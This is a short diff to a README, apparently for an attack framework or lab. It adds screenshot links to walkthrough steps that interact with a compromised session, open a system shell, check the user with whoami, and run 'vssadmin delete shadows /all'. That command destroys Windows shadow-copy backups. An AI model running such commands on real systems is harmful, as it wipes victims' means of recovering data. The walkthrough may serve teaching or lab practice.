@@ -26,10 +26,14 @@ sessions
 ```bash
  use <session_id>
 ```
+[Session Interaction](./screenshots/interact%20with%20session.png)
+
  Drop to system native command prompt 
 ```bash
 shell(#When Prompted 'are you an adult?' type Y) 
 ```
+[Shell](./screenshots/shell.png)
+
  Verify active sysytem shell
 ```bash
 whoami
@@ -38,3 +42,4 @@ whoami
 ```bash
 vssadmin delete shadows /all
 ```
+[Volume Deletion Attempt](./screenshots/Volume%20deletion.png)
